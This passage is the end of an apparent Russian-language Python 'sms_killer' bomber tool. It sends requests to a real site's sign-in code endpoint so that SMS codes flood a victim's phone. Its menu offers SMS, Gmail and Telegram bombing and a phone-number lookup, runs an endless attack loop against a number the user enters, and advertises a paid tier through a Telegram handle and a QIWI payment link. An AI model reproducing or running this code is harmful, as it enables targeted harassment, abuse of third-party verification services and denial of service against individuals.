            'returnUrl': '/connect/authorize/callback?client_id=www&amp;scope=openid%20offline_access%20email%20phone%20profile%20roles%20Sravni.Reviews.Service%20Sravni.Osago.Service%20Sravni.QnA.Service%20Sravni.FileStorage.Service%20Sravni.Memory.Service%20reviews%20Sravni.PhoneVerifier.Service%20Sravni.Identity.Service%20Sravni.VZR.Service%20messagesender.sms%20Sravni.Affiliates.Service%20esia%20orders.r&amp;response_type=code%20id_token%20token&amp;redirect_uri=https%3A%2F%2Fwww.sravni.ru%2Fopenid%2Fcallback%2F&amp;response_mode=form_post&amp;state=RmridyVgj733j_o_VUUUdgSTeMe1W3FdxzSMsz4IWP0&amp;nonce=zrwOa2xfDJLNRbfKi36P2VDjfAmlLZ-EnKg4u4Whwxs&amp;login_hint&amp;acr_values'}

        response = requests.post(
            'https://my.sravni.ru/signin/code',
            headers=headers,
            cookies=cookies,
            data=data,
            timeout=6
        )

    start(phone)

print(Fore.MAGENTA+logo)
print('       Для приобретения платной версия включающей\n       звонки и спам телеграма сообщениями\n       со своим текстом,писать в телеграм\n       @botnet_master')
time.sleep(5)
system("cls" if name == "nt" else "clear")
while True:
    RESET = '\033[0m'
    print(Fore.MAGENTA+logo)
    print(Fore.WHITE+'[' + Fore.GREEN + '1' + Fore.WHITE + '] - смс бомбер')
    print(Fore.WHITE+'[' + Fore.GREEN + '2' + Fore.WHITE + '] - gmail бомбер')
    print(Fore.WHITE+'[' + Fore.GREEN + '3' + Fore.WHITE + '] - telegram бомбер')
    print(Fore.WHITE+'[' + Fore.GREEN + '4' + Fore.WHITE + '] - узнать информацию о номере')
    print(Fore.WHITE+'[' + Fore.GREEN + '5' + Fore.WHITE + '] - запустить своего спам бота')
    print(Fore.WHITE + '[' + Fore.GREEN + '6' + Fore.WHITE + '] - поддержка')
    print(Fore.WHITE + '[' + Fore.GREEN + '7' + Fore.WHITE + '] - купить подписку')
    try:
        menua=int(input(Fore.RED+'sms_killer'+Fore.WHITE+'>> '))
    except:
        menua=None
        system("cls" if name == "nt" else "clear")
    if menua == 5:
        print('Введите токен с FatherBot')
        try:
            int(input(Fore.RED + 'sms_killer/token' + Fore.WHITE + '>> '))
        except:
            pass
        print(Fore.LIGHTGREEN_EX+'В разработке...')
    elif menua == 7:
        print(Fore.WHITE+'‼️Получение подписки\nДля пользователей киви:\n1) https://qiwi.com/p/79165885068 - переходим по ссылке\n2)Узнаем свой id\n4)В комментарий к платежу вписываем id\n3)Совершаем перевод на сумму 150 руб')
        ghj = input(Fore.WHITE + '[' + Fore.GREEN + '1' + Fore.WHITE + '] - написать админу\n'+Fore.WHITE + '[' + Fore.GREEN + '2' + Fore.WHITE + '] - выйти\n'+Fore.RED + 'sms_killer/money' + Fore.WHITE + '>> ')
        if ghj == '1':
            print(Fore.GREEN+'Открываю админа')
            system('termux-open-url https://t.me/botnet_master')
    elif menua == 6:
        print('Перейти в чат поддержки?')
        joi = input(Fore.WHITE + '[' + Fore.GREEN + '1' + Fore.WHITE + '] - да\n'+Fore.WHITE + '[' + Fore.GREEN + '2' + Fore.WHITE + '] - нет\n'+Fore.RED + 'sms_killer/help' + Fore.WHITE + '>> ')
        if joi == '1':
            system('termux-open-url https://t.me/sms_killer_chat')
        else:
            pass
    elif menua == 4:
        phone = input(Fore.RED+'Введите номер'+Fore.WHITE+'>> ')
        num(phone)
        sleep(5)
    elif menua == 1:
        print('Введите номер телефона на который необходимо произвести атаку')
        phone = input(Fore.RED + 'sms_killer/phone' + Fore.WHITE + '>> ')
        lol = 0
        print('Атака началась для остановки: Ctrl + Z')
        while True:
            lol=lol+1
            spam(phone)
            print(Fore.GREEN + 'Круг: ' + str(lol) + ' пройден.')
    elif menua == 2:
        gma=input('Введите почту которую хотите атаковать: ')
        assa=input('Введите текст письма: ')
        try:
            spam_gmail(gma,assa)
        except Exception as ea:
            print(ea)
        print(Fore.LIGHTGREEN_EX+'Атака началась')
    elif menua == 3:
        print(Fore.RED+'К сожалению спам телеграма доступен только при подписке на наш бомбер \n(цена 149 руб) если хотите приобрести пишите @botnet_master')
        print(Fore.WHITE+'[1] - перейти к покупке\n[2] - выйти')
        ag =int(input(Fore.RED+'sms_killer/vip'+Fore.WHITE+'>> '))
        if ag == 1:
            try:
                system('termux-open-url t.me/botnet_master')
            except:
                pass
        else:
            system("cls" if name == "nt" else "clear")
    else:
        system("cls" if name == "nt" else "clear")
        system('clear')
